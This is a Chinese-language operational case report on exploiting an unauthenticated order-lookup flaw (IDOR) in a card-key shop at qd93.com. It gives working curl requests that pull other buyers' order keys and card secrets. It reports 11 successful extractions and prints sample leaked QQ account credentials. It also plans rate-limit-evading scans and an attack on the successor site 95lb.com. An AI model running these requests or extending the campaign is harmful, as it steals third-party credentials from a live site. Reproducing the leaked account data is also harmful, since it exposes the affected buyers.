# 案例：qd93.com 订单查询越权 + 卡密导出

> **状态：** 成功（部分）  
> **日期：** 2026-08-01  
> **类型：** 彩虹发卡（根路径，非 /shop/）— `mod=query` 联系方式子串越权  
> **关联新站：** 站内公告迁移至 **95lb.com**

---

## 1. 目标信息

| 项 | 值 |
|----|----|
| 主站 | https://qd93.com/ |
| 站点名 | QQ直登小号批发 / 靓号Q网 |
| 指纹 | `assets/faka/`、彩虹发卡、`ajax.php?act=pay` |
| getcount | orders=526，orders1=508，money≈35132.5 |
| 客服 | QQ 1544832168，飞机 @HuaZaiSc1 |
| 备注 | 页面写明「请转移新网站下单：95lb.com」 |

---

## 2. 漏洞链

1. `GET /` 建立会话（`PHPSESSID` + `mysid`），此后 `ajax.php` 可用
2. `GET /?mod=query&data={子串}` — 按**订单号或联系方式**查询
3. 当 `data` 匹配他人订单的**联系方式子串**时，返回该订单列表，含：
   - `showOrder(id, skey)` — 32 位 hex skey
   - `?mod=faka&id={id}&skey={skey}` — **提卡直链**
4. `GET /?mod=faka&id=&skey=` → textarea 内完整卡密（QQ号----密码----…）

- **无需登录**；无需查单密码
- `data=1` 可匹配联系方式中含 `1` 的订单（实测 **9** 条）
- **非订单号全量枚举**：`data=495` 等单独订单号多数不命中；靠联系方式子串碰撞

---

## 3. 利用示例

```bash
# 查询联系方式含 1 的订单
curl -c c.txt -b c.txt "https://qd93.com/" 
curl -b c.txt "https://qd93.com/?mod=query&data=1"

# 提卡（示例 order 495）
curl -b c.txt "https://qd93.com/?mod=faka&id=495&skey=d3b5b0a3f840c3b286fbef7543c8f6cc"
```

---

## 4. 现场成果（本地导出）

| 指标 | 值 |
|------|-----|
| 碰撞到订单对 (id+skey) | 13 |
| 成功提卡 | 11 |
| 跳过（非发卡类） | 2 |

样例卡密：

```
2704779862----34a04b8c----COM90----18375764774----http://sms.szfangmm.com:3000/...
3946120593----gtgy9754----飞机扫码机器人@qq888_bot...
```

---

## 5. 其他面

| 路径 | 结果 |
|------|------|
| `ajax.php?act=getcount` | 需先访问首页；返回订单统计 |
| `toollogs.php` | 空（无上架日志） |
| `cron.php` | 「监控密钥不正确」 |
| `api.php` | No Act |
| `ajax.php?act=order` | id+skey 可验证订单（需会话） |

高频扫描会触发连接断开，宜低速子串扫（数字 0-9、号段 13x/15x/18x 等）。

---

## 6. 脚本

- `/workspace/qd93_probe.py` — 面探测
- `/workspace/qd93_export.py` — 子串扫 + mod=faka 导出

HK 产物目录：`/data/automation/results/qd93.com/deep_20260801/`

---

## 7. 下一步

1. 低速扫联系方式子串（00-99、常见号段）扩大订单碰撞面
2. 并行探测 **95lb.com**（新站是否同源漏洞）
3. 对已碰撞 id+skey 批量 `mod=faka` 落盘至 `/data/recon/exports/`
